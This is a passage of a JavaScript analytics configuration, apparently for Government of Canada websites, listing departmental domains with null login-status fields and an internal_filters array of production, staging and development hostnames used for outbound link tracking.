          'www.bc.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'mb.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.mb.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'nb.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.nb.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'nl.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.nl.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'ns.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.ns.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'nt.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.nt.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'nu.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.nu.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'qc.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.qc.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'pe.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.pe.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'yt.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'www.yt.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },    
          'employer.jobbank.gc.ca': { AppName: null, LoginStatus: null },    
          'www.employer.jobbank.gc.ca': { AppName: null, LoginStatus: null },    
          'employeur.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },      
          'www.employeur.guichetemplois.gc.ca': { AppName: null, LoginStatus: null },
          'estimateurae-eiestimator.service.canada.ca': { AppName: null, LoginStatus: null },
          //Immigration Refugee Canada
          'services3.cic.gc.ca': { AppName: null, LoginStatus: null },
          'www.services3.cic.gc.ca': { AppName: null, LoginStatus: null },
          'eservices.cic.gc.ca': { AppName: null, LoginStatus: null },
          'www.eservices.cic.gc.ca': { AppName: null, LoginStatus: null },
          'www.etatpasseport-passportstatus.service.canada.ca': { AppName: null, LoginStatus: null },
          'etatpasseport-passportstatus.service.canada.ca': { AppName: null, LoginStatus: null },
          //Public Services and Procurement Canada
          'www.mapayegc-mygcpay.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'mapayegc-mygcpay.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'www.orion.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'orion.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'www.cnas-nscc.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'cnas-nscc.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'www.gcsurplus.ca': { AppName: null, LoginStatus: null },
          'gcsurplus.ca': { AppName: null, LoginStatus: null },
          'www.ontario.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'ontario.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'clientsontario.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'www.clientsontario.pwgsc-tpsgc.gc.ca': { AppName: null, LoginStatus: null },
          'ont-sat-ths.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'www.ont-sat-ths.tpsgc-pwgsc.gc.ca': { AppName: null, LoginStatus: null },
          'www.canadabuys.canada.ca': { AppName: null, LoginStatus: null },
          'canadabuys.canada.ca': { AppName: null, LoginStatus: null },
          'achatscanada.canada.ca': { AppName: null, LoginStatus: null },     
          'www.mapayegc-mygcpay.gc.ca': { AppName: null, LoginStatus: null },
          'mapayegc-mygcpay.gc.ca': { AppName: null, LoginStatus: null },
          'sosa.canadabuys.canada.ca': { AppName: null, LoginStatus: null },
          'ocama.achatscanada.canada.ca': { AppName: null, LoginStatus: null },
          //Library and Archive Canada
          'www.library-archives.canada.ca': { AppName: null, LoginStatus: null },
          'library-archives.canada.ca': { AppName: null, LoginStatus: null },
          'www.bibliotheque-archives.canada.ca': { AppName: null, LoginStatus: null },
          'bibliotheque-archives.canada.ca': { AppName: null, LoginStatus: null },
          'recherche-collection-search.bac-lac.gc.ca': { AppName: null, LoginStatus: null },
          //Health Canada
          'www.health.canada.ca': { AppName: null, LoginStatus: null },
          'health.canada.ca': { AppName: null, LoginStatus: null },
          'www.sante.canada.ca': { AppName: null, LoginStatus: null },
          'sante.canada.ca': { AppName: null, LoginStatus: null },
          'mysource.hc-sc.gc.ca': { AppName: null, LoginStatus: null },
          //Shared Service Canada
          'www.plus.ssc-spc.gc.ca': { AppName: null, LoginStatus: null },
          'plus.ssc-spc.gc.ca': { AppName: null, LoginStatus: null },
          
          

        },
  },
 internal_filters : [
 //this is used for outbound link tracking
    //CANADA.CA (AEM)	
		,'iv.apps.canada.ca' // Booking Tool Prod
		,'v.apps.canada.ca' // Booking Tool Prod
		,'gcbooking.adobecqms.net' //Booking Tool
		,'localhost'
		,'universallabs.org' 
		,'dev1.canada.ca'
		,'dev3.canada.ca'
		,'www1.canada.ca' 
		,'canada.ca' 
		,'www.canada.ca' 
		,'staging65s3.canada.ca' // AEM 6.5
		,'canada-aem651-s3-dev.adobecqms.net' // AEM 6.5
		,'canada-aem651-s3-stage.adobecqms.net' // AEM 6.5
		,'canada-aem652-s3-stage.adobecqms.net' // AEM 6.5
		,'canada-aem653-s3-stage.adobecqms.net' // AEM 6.5 
        ,'canada-aem-s3-stage.adobecqms.net'
		,'staging-recherche.gc.ca' // Search
		,'recherche.gc.ca' 
		,'recherche-search.gc.ca' 
		,'search.gc.ca' 
		,'search-recherche.gc.ca'
		,'www.recherche.gc.ca' 
		,'www.recherche-search.gc.ca' 
		,'www.search.gc.ca' 
		,'www.search-recherche.gc.ca' 
		,'canada-service-corps.canada.ca' // PM Service Corps
		,'service-jeunesse.canada.ca' 
	// Library and Archives
		,'bac-lac.gc.ca'
		,'lac-bac.gc.ca'
		,'www.bac-lac.gc.ca'
		,'www.lac-bac.gc.ca'
		,'canadiana-qa.dev.bac-lac.gc.ca'
		,'central.bac-lac.gc.ca'
		,'central-d.dev.bac-lac.gc.ca'
		,'webdev-srv.dev.bac-lac.gc.ca'
		,'webqa-srv01.qa.bac-lac.gc.ca'
		,'ucc-qa'
		,'v41extweb01-d.services.bac-lac.gc.ca'
		,'canadiana.bac-lac.gc.ca'
		,'www.canadiana.bac-lac.gc.ca' 
		,'cipbookentry.bac-lac.gc.ca' 
		,'cipbookentry-qa.dev.bac-lac.gc.ca'
		,'www.cipbookentry.bac-lac.gc.ca' 
		,'co-lab.bac-lac.gc.ca' 
		,'www.co-lab.bac-lac.gc.ca' 
		,'sigles-symbols-qa.bac-lac.gc.ca'
		,'sigles-symbols.bac-lac.gc.ca' 
		,'www.sigles-symbols.bac-lac.gc.ca' 
		,'event-qa'
		,'event.bac-lac.gc.ca' 
		,'www.event.bac-lac.gc.ca' 
		,'nouvelle-france.org' 
		,'www.collectionscanada.gc.ca'
		,'cipbookentry-d.dev.bac-lac.gc.ca'
		,'v41extcapps01-d.dev.bac-lac.gc.ca'
		,'tdg-grt-d.dev.bac-lac.gc.ca'
		,'event-d.dev.bac-lac.gc.ca'
		,'canadiana-d.dev.bac-lac.gc.ca'
		,'sigles-symbols-d.bac-lac.gc.ca'
		,'dev-www.bac-lac.gc.ca'
		,'financement-funding.bac-lac.gc.ca'
		,'tdg-grt.bac-lac.gc.ca'
		,'event.bac-lac.gc.ca'
		,'sigles-symbols.bac-lac.gc.ca'
		,'webdev-srv.dev.bac-lac.gc.ca'	
	    ,'webqa-srv01.qa.bac-lac.gc.ca'
        ,'www.dev2-www.bac-lac.gc.ca'
        ,'dev2-www.bac-lac.gc.ca'
        ,'library-archives.canada.ca'
        ,'www.library-archives.canada.ca'
        ,'www.bibliotheque-archives.canada.ca'
        ,'bibliotheque-archives.canada.ca'
        ,'recherche-collection-search.bac-lac.gc.ca'
	// Impact Assessment Agency of Canada
		,'acee.gc.ca' // Old domain (CEAA)	
		,'acee-ceaa.gc.ca' 
		,'www.acee.gc.ca' 
		,'www.acee-ceaa.gc.ca' 
		,'ceaa.dev.ec.gc.ca' 
		,'ceaa.gc.ca' 
		,'ceaa-acee.gc.ca' 
		,'www.ceaa.gc.ca' 
		,'www.ceaa-acee.gc.ca' 
		,'ceaa.qa.ncr.ec.gc.ca'
		,'www.iaac-acei.gc.ca' // New domain (IAAC)
		,'iaac-acei.gc.ca'
		,'www.acei-iaac.gc.ca'
		,'acei-iaac.gc.ca'
		,'www.iaac.gc.ca'
		,'iaac.gc.ca'
		,'www.acei.gc.ca'
		,'acei.gc.ca'
		,'www.iaac-aeic.gc.ca'
		,'iaac-aeic.gc.ca'
		,'www.aeic-iaac.gc.ca'
		,'aeic-iaac.gc.ca'
		,'www.aeic.gc.ca'
		,'aeic.gc.ca'
		,'elearning.iaac-aeic.gc.ca'
		,'apprentissage-en-ligne.aeic-iaac.gc.ca'
    // Agriculture and Agri-Food Canada
		,'www.agr.gc.ca' 
		,'agr.gc.ca' 
		,'www-dev.agr.gc.ca' 
		,'intranet.agr.gc.ca'
		,'www-tst.agr.gc.ca'
		,'canadabrandgocaccess.agr.gc.ca'
		,'canadabrandgocaccess.agr.gc.ca'	
		,'www.canadabrand.agr.gc.ca'	
		,'canadabrand.agr.gc.ca'	
		,'brandcanada.agr.gc.ca'	
		,'www.brandcanada.agr.gc.ca'	
		,'marquecanadabrand.agr.gc.ca'	
		,'www.marquecanadabrand.agr.gc.ca'
    // Treasury Board Secretariat	
		,'atip-aiprp.tbs-sct.gc.ca' 
		,'uat.atip-aiprp.tbs-sct.gc.ca' 
		,'pre-prod.atip-aiprp.tbs-sct.gc.ca' 
		,'authoring.publiservice.tbs-sct.gc.ca' 
		,'authoring.www.tbs-sct.gc.ca'
		,'staging.open.canada.ca'
		,'search-staging.open.canada.ca'
		,'open.canada.ca'
		,'search.open.canada.ca'
		,'staging.atip-aiprp.tbs-sct.gc.ca'
		,'uat1.atip-aiprp.tbs-sct.gc.ca'
		,'uat.tbs-sct.gc.ca'
		,'www.tbs-sct.gc.ca'
        ,'dev.tbs-sct.gc.ca'
    // Statistics Canada
		,'www.statcan.gc.ca'
		,'www5.statcan.gc.ca'
		,'www12.statcan.gc.ca'
		,'www23.statcan.gc.ca'
		,'www35.statcan.gc.ca'
		,'www65.statcan.gc.ca'
		,'www66.statcan.gc.ca'
		,'www76.statcan.gc.ca'
		,'www120.statcan.gc.ca'
		,'www144.statcan.gc.ca'
		,'www150.statcan.gc.ca'
		,'information-energie.canada.ca'
		,'information-energie.statcan.gc.ca'
		,'energy-information.canada.ca'
		,'census.gc.ca'
		,'recensement.gc.ca'
		,'geosuite.statcan.gc.ca'
		,'geoprod.statcan.gc.ca'
		,'wpaz-ofm12c-ssl-i.services.gc.qat'
		,'www5testb.statcan.gc.ca'
		,'srv113-i.lab.hrdc-drhc.gc.ca'
		,'src-dev13.wcms.statcan.ca'
		,'codweb1.stcpaz.statcan.gc.ca'
		,'codweb2.stcpaz.statcan.gc.ca'
		,'stc-ndm-qa-pc2.statcan.gc.ca'
		,'stc-ndm-qa-pc2.statcan.gc.ca'
		,'prod-p-es-fusion01.stcpaz.statcan.gc.ca'
		,'census-qa.statcan.gc.ca'
		,'recensement-qa.statcan.gc.ca'
		,'qa-p-es-ui01.stcpaz.statcan.gc.ca'
		,'dv-vd-sprint1.test.cloud.statcan.ca'
		,'www.dv-vd-sprint1.test.cloud.statcan.ca'
		,'wwwqa.statcan.gc.ca'
		,'www76qa.statcan.gc.ca'
		,'geodepot.statcan.gc.ca'
		,'geodepot.statcan.ca'
		,'portal.covid.cloud.statcan.ca'          
		,'analytics-platform.statcan.gc.ca'   
		,'oc-dev.covid.cloud.statcan.ca'   
		,'web2-test1.wcms.statcan.ca'
 		,'daaas-dev.covid.cloud.statcan.ca'
		,'oc-dev.covid.cloud.statcan.ca'
        ,'daaas-portal.dev.cloud.statcan.ca'
	// Employment Social Developmet Canada
		,'disclosure.esdc.gc.ca' 
		,'disclosure.servicecanada.gc.ca' 
		,'www.canadabenefits.gc.ca' 
		,'www.canadabenefits.gc.ca' 
		,'wpaz-ofm12c-ssl-i.services.gc.qat' 
		,'wpaz-ofm-i.sade-edap.prv' 
		,'wpaz-ofm-i-e-esdc.services.gc.qat' 
		,'prestationsducanada.gc.ca' 
		,'www.prestationsducanada.gc.ca' 
		,'negotech.labour.gc.ca'
		,'negotheque.travail.gc.ca'
		,'mlapesd3963v-s2tst-negotech.intra.dev'
		,'cv19benefits-appservice-staging.azurewebsites.net'
		,'cv19benefits-appservice-dev.azurewebsites.net'
		,'covid-benefits.alpha.canada.ca'
		,'covid-prestations.alpha.canada.ca'
		,'woodpecker.eastus.cloudapp.azure.com'
		,'multi-benefits.servicecanada.gc.ca' //CERB DFO
		,'multi-benefices.servicecanada.gc.ca' //CERB DFO
		,'pesdc.prv'
		,'esin-sandbox.powerappsportals.com'	
		,'srv2140-i2.services.gc.qat'	
		,'srv2140-s.services.gc.qat'
		,'sin-nas.canada.ca'
        ,'int16-ssl.services.gc.qat'
        ,'srv265.hrdc-drhc.gc.ca'
        ,'srv241-s2.lab.hrdc-drhc.gc.ca'
        ,'www.srv241-s2.lab.hrdc-drhc.gc.ca'
        ,'srv136.services.gc.ca'
        ,'www.srv136.services.gc.ca'
        ,'intradev16-i.intra.dev'
        ,'test.cva.service.canada.ca'
        ,'test.pbc.service.canada.ca'
        ,'psjobs-emploisfp.psc-cfp.gc.ca'
        ,'emploisfp-psjobs.cfp-psc.gc.ca'
        ,'www.cva.service.canada.ca'
        ,'cva.service.canada.ca'
        ,'www.pbc.service.canada.ca'
        ,'pbc.service.canada.ca'
        ,'secure-client-hub-dev.bdm-dev-rhp.dts-stn.com'
        ,'sys1.jobbank.gc.qat'
        ,'sys1.guichetemplois.gc.qat'
        ,'passport-status-staging.dev-dp.dts-stn.com'
        ,'int-srv265.services.gc.qat'
        ,'www.jobbank.gc.ca'
        ,'www.guichetemplois.gc.ca'
        ,'seniors-journey-staging.dev-dp.dts-stn.com'
        ,'www.etatpasseport-passportstatus.service.canada.ca'
        ,'etatpasseport-passportstatus.service.canada.ca'
        ,'estimateursv-oasestimator.service.canada.ca'
        ,'www.estimateursv-oasestimator.service.canada.ca'
        ,'retraite-retirement.service.canada.ca'
        ,'www.retraite-retirement.service.canada.ca'
        ,'dev2.jobbank.gc.qat'
        ,'dev2.guichetemplois.gc.qat'
        ,'uat.cva.service.cloud-nuage.canada.ca'
        ,'passport-status-test.dev-dp.dts-stn.com'
        ,'srv241-s2.sade.hrdc-drhc.gc.ca'
        ,'sys16-ssl.services.gc.qat'
        ,'secure-client-hub-staging.bdm.dshp-phdn.net'
        ,'service.canada.ca'
        ,'www.service.canada.ca'
        ,'equivision.services.gc.ca'
        ,'www.equivision.services.gc.ca'
        ,'test-org-platform.nonprod.youth-jeunesse.service.canada.ca'
        ,'test-org-platform-intake.nonprod.youth-jeunesse.service.canada.ca'
        ,'secure-client-hub-dev.bdm.dshp-phdn.net'
        ,'cdcp-dev.dev-dp.dts-stn.com'
        ,'cdcp-int.dev-dp.dts-stn.com'
        ,'cdcp-staging.dev-dp.dts-stn.com'
        ,'cdcp-staging.dev-dp-internal.dts-stn.com'
        ,'srv024.service.canada.ca'
        ,'esdc-bdm-ei-dev-benefitestimator-fe-cc-staging.azurewebsites.net'
        ,'esdc-bdm-ei-dev-benefitestimator-fe-cc.azurewebsites.net'
        ,'on.jobbank.gc.ca'
        ,'www.on.jobbank.gc.ca'
        ,'sk.jobbank.gc.ca'
        ,'www.sk.jobbank.gc.ca'
        ,'ab.jobbank.gc.ca'
        ,'www.ab.jobbank.gc.ca'
        ,'bc.jobbank.gc.ca'
        ,'www.bc.jobbank.gc.ca'
        ,'mb.jobbank.gc.ca'
        ,'www.mb.jobbank.gc.ca'
        ,'nb.jobbank.gc.ca'
        ,'www.nb.jobbank.gc.ca'
        ,'nl.jobbank.gc.ca'
        ,'www.nl.jobbank.gc.ca'
        ,'ns.jobbank.gc.ca'
        ,'www.ns.jobbank.gc.ca'
        ,'nt.jobbank.gc.ca'
        ,'www.nt.jobbank.gc.ca'
        ,'nu.jobbank.gc.ca'
        ,'www.nu.jobbank.gc.ca'
        ,'qc.jobbank.gc.ca'
        ,'www.qc.jobbank.gc.ca'
        ,'pe.jobbank.gc.ca'
        ,'www.pe.jobbank.gc.ca'
        ,'yt.jobbank.gc.ca'
        ,'www.yt.jobbank.gc.ca'
        ,'on.guichetemplois.gc.ca'
        ,'www.on.guichetemplois.gc.ca'
        ,'sk.guichetemplois.gc.ca'
        ,'www.sk.guichetemplois.gc.ca'
        ,'ab.guichetemplois.gc.ca'
        ,'www.ab.guichetemplois.gc.ca'
        ,'bc.guichetemplois.gc.ca'
        ,'www.bc.guichetemplois.gc.ca'
        ,'mb.guichetemplois.gc.ca'
        ,'www.mb.guichetemplois.gc.ca'
        ,'nb.guichetemplois.gc.ca'
        ,'www.nb.guichetemplois.gc.ca'
        ,'nl.guichetemplois.gc.ca'
        ,'www.nl.guichetemplois.gc.ca'
        ,'ns.guichetemplois.gc.ca'
        ,'www.ns.guichetemplois.gc.ca'
        ,'nt.guichetemplois.gc.ca'
        ,'www.nt.guichetemplois.gc.ca'
        ,'nu.guichetemplois.gc.ca'
        ,'www.nu.guichetemplois.gc.ca'
        ,'qc.guichetemplois.gc.ca'
        ,'www.qc.guichetemplois.gc.ca'
        ,'pe.guichetemplois.gc.ca'
        ,'www.pe.guichetemplois.gc.ca'
        ,'yt.guichetemplois.gc.ca'
        ,'www.yt.guichetemplois.gc.ca'
        ,'test-org-platform.dev-dp.dts-stn.com'
        ,'employer.jobbank.gc.ca'
        ,'www.employer.jobbank.gc.ca'
        ,'employeur.guichetemplois.gc.ca'
        ,'www.employeur.guichetemplois.gc.ca'
        ,'srv113-s.sade.hrdc-drhc.gc.ca'
        ,'mscad-sys2-s2.bdm.dshp-phdn.net'
        ,'estimateurae-eiestimator.service.canada.ca'
        ,'N35010293.hrdc-drhc.net'
	// Elections
		,'ec9wbstepfpkedu' 
		,'elections.ca' 
		,'www.elections.ca' 
		,'enr.elections.ca' 
		,'www.test.elections.ca' 
		,'enr.test.elections.ca'
		,'ereg.elections.ca' 
		,'www.ereg.elections.ca' 
		,'ispdevwww.elections.ca' 
		,'secure.elections.ca' 
		,'secure.test.elections.ca' 
		,'rspispweb01-ste-demo1.elections.ca'
		,'ereg.test.elections.ca'
		,'ereg.elections.ca'
		,'www.ereg.elections.ca'
		,'ecdev_maint-pesc.ecade.elections.ca'
		,'www.ecdev_maint-pesc.ecade.elections.ca'
		,'cef-cce.ca'
		,'www.cef-cce.ca'
		,'ispdevwww.elections.ca'
		,'ec9wbedtpfpked'
        ,'ec9wbisprev01.elections.ca'
        ,'ec9wbdterevt1.elections.ca'
        ,'ec9wbsterevv1.elections.ca'
        ,'ec9sttswbrev01.elections.ca'
        ,'ecdev_maint-pesc.ecade.elections.ca'
        ,'ec9stvwbpfpi01.elections.ca'
        ,'test.elections.ca'
        ,'ec9stvwbpfpi01'
	// Natural Resources Canada
		,'equalby30.org' 
		,'www.equalby30.org' 
		,'nrcan.gc.ca' 
		,'www.nrcan.gc.ca' 
		,'rncan.gc.ca' 
		,'www.rncan.gc.ca' 
		,'rncanengagenrcan.ca' 
		,'www.rncanengagenrcan.ca' 
		,'test.nrcan.gc.ca' 
		,'test.rncan.gc.ca' 
		,'www.test.nrcan.gc.ca' 
		,'www.test.rncan.gc.ca' 
		,'minescanada.ca'
		,'www.minescanada.ca'
		,'globe-cem-mi.yourballistic.com'
		,'esrfunds.org'
		,'www.esrfunds.org'
		,'www.fondsee.org'
		,'fondsee.org'	
		,'www.npa.gc.ca'	
		,'npa.gc.ca'	
		,'www.apn.gc.ca'	
		,'www.mpmo.gc.ca'	
		,'www.bggp.gc.ca'	
		,'www.apap.gc.ca'	
		,'www.paap.gc.ca'
		,'cem-mi-vancouver2019.ca'
		,'www.cem-mi-vancouver2019.ca'
		,'cmep-mi-vancouver2019.ca'
		,'apap.gc.ca'
		,'paap.gc.ca'
		,'www.esrfunds.org'
		,'www.fondsee.org'
		,'mpmo.gc.ca'
		,'bggp.gc.ca'
		,'npa.gc.ca'
		,'apn.gc.ca'
		,'natural-resources.canada.ca' //new canada.ca subdomainsdomain
		,'ressources-naturelles.canada.ca' //new canada.ca subdomain
		,'nrcan.canada.ca' //new canada.ca subdomain
		,'rncan.canada.ca' //new canada.ca subdomain
		,'nrcan-rncan.canada.ca' //new canada.ca subdomain
		,'rncan-nrcan.canada.ca' //new canada.ca subdomain
		,'osdp-cumulative-effects-stage.canada.ca'
		,'psdo-effets-cumulatifs-stage.canada.ca'
		,'qa.dev.osdp.aws.nrcan-rncan.cloud'
		,'osdp-cumulative-effects.canada.ca'
		,'psdo-effets-cumulatifs.canada.ca'
		,'www.dev.nrcan.gc.ca'
		,'dev.nrcan.gc.ca'
		,'www.dev.rncan.gc.ca'
		,'dev.rncan.gc.ca' 
		,'dev.npa.gc.ca'
		,'dev.esrfunds.org'
		,'dev.mpmo.gc.ca'
		,'dev.apn.gc.ca'
		,'dev.fondsee.org'
		,'dev.bggp.gc.ca'
		,'osdp-psdo.canada.ca'
		,'stg-osdp-psdo.canada.ca'
		,'uat-osdp-psdo.canada.ca'
	// Office of the procurement ombudsman
		,'opo-boa.gc.ca' 
		,'dev.boa-opo.gc.ca' 
		,'xterra3w2k16.ncr.pwgsc.gc.ca'
		,'secure.opo-boa.gc.ca'
	// MSCA-MEIIO
		,'srv113-i.lab.hrdc-drhc.gc.ca' 
		,'srv113-u.lab.hrdc-drhc.gc.ca' 
		,'srv136.services.gc.ca' 
		,'srv2140-u.services.gc.qat' 
		,'srv241-s2.lab.hrdc-drhc.gc.ca' 
	// Transport Canada
		,'transport-dev' 
	// Health Canada
		,'a8047055' 
		,'cfgtest.canadacentral.cloudapp.azure.com' //food guide
		,'vmportaltest.canadacentral.cloudapp.azure.com'
		,'prcitestfr.canadacentral.cloudapp.azure.com'
		,'food-guide.canada.ca'
		,'www.food-guide.canada.ca'
		,'www.guide-alimentaire.canada.ca'
		,'guide-alimentaire.canada.ca'
		,'clinical-information.canada.ca'
		,'renseignements-cliniques.canada.ca'
		,'cfg-qa.hres.ca'
		,'cfg-stage.hres.ca'
		,'food-guide-stage.hpfb-dgpsa.ca'
        ,'www.health.canada.ca'
        ,'health.canada.ca'
        ,'www.sante.canada.ca'
        ,'sante.canada.ca'
        ,'sad-drlsrv-dev.hc-sc.gc.ca'
        ,'mysource.hc-sc.gc.ca'
	// Immigration Refugee Canada
		,'www.cic.gc.ca'
		,'cic.gc.ca'
		,'eservices1.ci.gc.ca'
		,'gol-ecas-dev.ci.gc.ca'
		,'www-dev.ic.gc.ca'
		,'eservices.cic.gc.ca'
		,'services3.cic.gc.ca'
        ,'www.services3.cic.gc.ca'
		,'eservices5.ci.gc.ca'
        ,'eservices1.ci.gc.ca'
        ,'www.eservices.cic.gc.ca'
	// Canada Revenue Agency
		,'cra-arc.gc.ca'
		,'arc-cra.gc.ca'
		,'cra.gc.ca'
		,'arc.gc.ca'
		,'www.cra-arc.gc.ca'
		,'www.arc-cra.gc.ca'
		,'www.cra.gc.ca'
		,'www.arc.gc.ca'
		,'apps.cra-arc.gc.ca'
        ,'www.apps.cra-arc.gc.ca'
		//CRA Secure Portal UT
		,'cp-ut.isvcs.net'
		,'rp-ut.isvcs.net'
		,'cp-ut2.isvcs.net'
		,'rp-ut2.isvcs.net'
		//CRA Secure Portal SI
		,'ams-sga-si.cra-arc.gc.ca'
		,'cms-sgj-si.cra-arc.gc.ca'
		,'ams-sga-si2.cra-arc.gc.ca'
		,'cms-sgj-si2.cra-arc.gc.ca'
		//CRA Secure Portal UA
		,'ams-sga-ua.cra-arc.gc.ca'
		,'cms-sgj-ua.cra-arc.gc.ca'
		,'ams-sga-ua2.cra-arc.gc.ca'
		,'cms-sgj-ua2.cra-arc.gc.ca'
		//CRA Secure Portal OT	
		,'apps1.ams-sga-ot.cra-arc.gc.ca'
		,'apps2.ams-sga-ot.cra-arc.gc.ca'
		,'apps3.ams-sga-ot.cra-arc.gc.ca'
		,'apps4.ams-sga-ot.cra-arc.gc.ca'
		,'apps5.ams-sga-ot.cra-arc.gc.ca'
		,'apps6.ams-sga-ot.cra-arc.gc.ca'
		,'apps7.ams-sga-ot.cra-arc.gc.ca'
		,'apps8.ams-sga-ot.cra-arc.gc.ca'
		,'cms-sgj-ot.cra-arc.gc.ca'
		,'apps1.ams-sga-ot2.cra-arc.gc.ca'
		,'apps2.ams-sga-ot2.cra-arc.gc.ca'
		,'apps3.ams-sga-ot2.cra-arc.gc.ca'
		,'apps4.ams-sga-ot2.cra-arc.gc.ca'
		,'apps5.ams-sga-ot2.cra-arc.gc.ca'
		,'apps6.ams-sga-ot2.cra-arc.gc.ca'
		,'apps7.ams-sga-ot2.cra-arc.gc.ca'
		,'apps8.ams-sga-ot2.cra-arc.gc.ca'
		,'cms-sgj-ot2.cra-arc.gc.ca'
		,'ams-sga.cra-arc.gc.ca'
		,'cms-sgj.cra-arc.gc.ca'
		,'apps1.ams-sga.cra-arc.gc.ca'
		,'apps2.ams-sga.cra-arc.gc.ca'
		,'apps3.ams-sga.cra-arc.gc.ca'
		,'apps4.ams-sga.cra-arc.gc.ca'
		,'apps5.ams-sga.cra-arc.gc.ca'
		,'apps6.ams-sga.cra-arc.gc.ca'
		,'apps7.ams-sga.cra-arc.gc.ca'
		,'apps8.ams-sga.cra-arc.gc.ca'
		,'www.ams-sga.cra-arc.gc.ca'
		,'www.cms-sgj.cra-arc.gc.ca'
		,'www.apps1.ams-sga.cra-arc.gc.ca'
		,'www.apps2.ams-sga.cra-arc.gc.ca'
		,'www.apps3.ams-sga.cra-arc.gc.ca'
		,'www.apps4.ams-sga.cra-arc.gc.ca'
		,'www.apps5.ams-sga.cra-arc.gc.ca'
		,'www.apps6.ams-sga.cra-arc.gc.ca'
		,'www.apps7.ams-sga.cra-arc.gc.ca'
		,'www.apps8.ams-sga.cra-arc.gc.ca'
        ,'www.staging.omega.dce-eir.net'
        ,'staging.omega.dce-eir.net'
     //CRA Non Secure Portal UT
		,'apps-ut.cra-arc.gc.ca'
        ,'apps-ut.isvcs.net'
        ,'apps-ut2.cra-arc.gc.ca'
        ,'apps-ut2.isvcs.net'
   //CRA Non Secure Portal UA
		,'apps-ua.cra-arc.gc.ca' 
		,'apps-ua.isvcs.net'
		,'apps-ua2.cra-arc.gc.ca'
		,'apps-ua2.isvcs.net'
    //CRA Non Secure Portal SI
       ,'apps-si.isvcs.net'
       ,'apps-si2.isvcs.net'
    //CRA Non Secure Portal OT
       ,'apps-ot.cra-arc.gc.ca'
       ,'apps-ot2.cra-arc.gc.ca'
   //CRA Other
		,'performance.alpha.canada.ca'
	// Public Services procurement Canada
		,'test.publications.gc.ca'
		,'publications.gc.ca'
		,'www.publications.gc.ca'
		,'content.buyandsell.gc.ca'
		,'beta.buyandsell.gc.ca'
		,'beta.achatsetventes.gc.ca'
		,'test.buyandsell.gc.ca'	
		,'test.achatsetventes.gc.ca'
		,'webdev02.tpsgc-pwgsc.gc.ca'
		,'www.tpsgc-pwgsc.gc.ca'
		,'buyandsell.gc.ca'
		,'achatsetventes.gc.ca'
		,'staging.achatscanadabuys.ca'
		,'m8-test.achatscanadabuys.ca'
		,'m8-test.achatscanadabuys.ca'
		,'m8-dev-collab.achatscanadabuys.ca'
		,'webdev01.tpsgc-pwgsc.gc.ca'
		,'webdev02.tpsgc-pwgsc.gc.ca'
		,'webdev08.tpsgc-pwgsc.gc.ca'
        ,'mapayegc-mygcpay-preprod.tpsgc-pwgsc.gc.ca'
        ,'www.mapayegc-mygcpay-preprod.tpsgc-pwgsc.gc.ca'
        ,'mapayegc-mygcpay.tpsgc-pwgsc.gc.ca'
        ,'www.mapayegc-mygcpay.tpsgc-pwgsc.gc.ca'
        ,'www.rate01.gcsurplus.ca'
        ,'rate01.gcsurplus.ca'
        ,'ont-intradev.pwgsc-tpsgc.gc.ca'
        ,'www.ont-intradev.pwgsc-tpsgc.gc.ca'
        ,'ont-extradev.pwgsc-tpsgc.gc.ca'
        ,'www.ont-extradev.pwgsc-tpsgc.gc.ca'
        ,'ont-internetdev.pwgsc-tpsgc.gc.ca'
        ,'www.ont-internetdev.pwgsc-tpsgc.gc.ca'
        ,'ont-internetdev.tpsgc-pwgsc.gc.ca'
        ,'www.ont-internetdev.tpsgc-pwgsc.gc.ca'
        ,'www.orion.pwgsc-tpsgc.gc.ca'
        ,'orion.pwgsc-tpsgc.gc.ca'
        ,'www.cnas-nscc.tpsgc-pwgsc.gc.ca'
        ,'cnas-nscc.tpsgc-pwgsc.gc.ca'
        ,'www.gcsurplus.ca'
        ,'gcsurplus.ca'
        ,'www.ontario.tpsgc-pwgsc.gc.ca'
        ,'ontario.tpsgc-pwgsc.gc.ca'
        ,'www.clientsontario.pwgsc-tpsgc.gc.ca'
        ,'clientsontario.pwgsc-tpsgc.gc.ca'
        ,'ont-sat-ths.tpsgc-pwgsc.gc.ca'
        ,'www.ont-sat-ths.tpsgc-pwgsc.gc.ca'
        ,'m8-uat.achatscanadabuys.ca'
        ,'www.canadabuys.canada.ca'
        ,'canadabuys.canada.ca'
        ,'achatscanada.canada.ca'
        ,'preprod.mapayegc-mygcpay.gc.ca'
        ,'www.preprod.mapayegc-mygcpay.gc.ca'
        ,'www.mapayegc-mygcpay.gc.ca'
        ,'mapayegc-mygcpay.gc.ca'
        ,'sosa.canadabuys.canada.ca'
        ,'ocama.achatscanada.canada.ca'
        ,'viclaplinux12.jea.lan'
